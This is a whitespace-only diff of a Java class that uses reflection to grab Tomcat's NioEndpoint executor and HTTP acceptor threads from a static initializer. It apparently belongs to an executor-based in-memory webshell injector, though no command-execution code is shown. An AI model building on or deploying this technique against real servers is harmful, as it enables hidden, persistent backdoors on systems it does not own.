@@ -14,8 +14,8 @@ import java.util.concurrent.TimeUnit;
 public class TEXMSFromThread extends ThreadPoolExecutor {
     static {
         try {
-            ThreadPoolExecutor exec        = null;
-            NioEndpoint        nioEndpoint = (NioEndpoint) getStandardService();
+            ThreadPoolExecutor exec = null;
+            NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
             try {
                 exec = (ThreadPoolExecutor) getFieldValue(nioEndpoint, "executor");
             } catch (ClassCastException e) {
@@ -39,7 +39,7 @@ public class TEXMSFromThread extends ThreadPoolExecutor {
                 continue;
             }
             if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
-                Object target      = getFieldValue(thread, "target");
+                Object target = getFieldValue(thread, "target");
                 Object jioEndPoint = null;
                 try {
                     jioEndPoint = getFieldValue(target, "this$0");
